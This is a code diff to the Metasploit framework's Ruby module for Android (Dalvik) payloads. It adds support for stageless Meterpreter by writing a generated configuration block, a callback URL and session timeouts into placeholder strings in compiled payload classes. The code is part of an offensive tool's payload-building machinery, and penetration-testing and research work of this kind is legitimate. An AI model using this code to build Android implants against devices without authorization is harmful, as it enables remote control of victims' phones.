@@ -1,7 +1,12 @@
 # -*- coding: binary -*-
 require 'msf/core'
+require 'msf/core/payload/uuid/options'
+require 'msf/core/payload/transport_config'
 
 module Msf::Payload::Dalvik
+
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::UUID::Options
 
   #
   # Fix the dex header checksum and signature
@@ -31,14 +36,36 @@ module Msf::Payload::Dalvik
     [str.length].pack("N") + str
   end
 
-  def apply_options(classes)
+  def apply_options(classes, opts, url)
     timeouts = [
       datastore['SessionExpirationTimeout'].to_s,
       datastore['SessionCommunicationTimeout'].to_s,
       datastore['SessionRetryTotal'].to_s,
       datastore['SessionRetryWait'].to_s
     ].join('-')
-    string_sub(classes, 'TTTT                                ', 'TTTT' + timeouts)
+    if opts[:stageless]
+      config = generate_config_hex(opts)
+      string_sub(classes, 'UUUU' + ' ' * 8191, 'UUUU' + config)
+    end
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
+    string_sub(classes, 'TTTT' + ' ' * 48, 'TTTT' + timeouts)
+  end
+
+  def generate_config_hex(opts={})
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      ascii_str:  true,
+      arch:       opts[:uuid].arch,
+      expiration: datastore['SessionExpirationTimeout'].to_i,
+      uuid:       opts[:uuid],
+      transports: [transport_config(opts)]
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config.to_b.unpack('H*').first
   end
 
   def string_sub(data, placeholder="", input="")
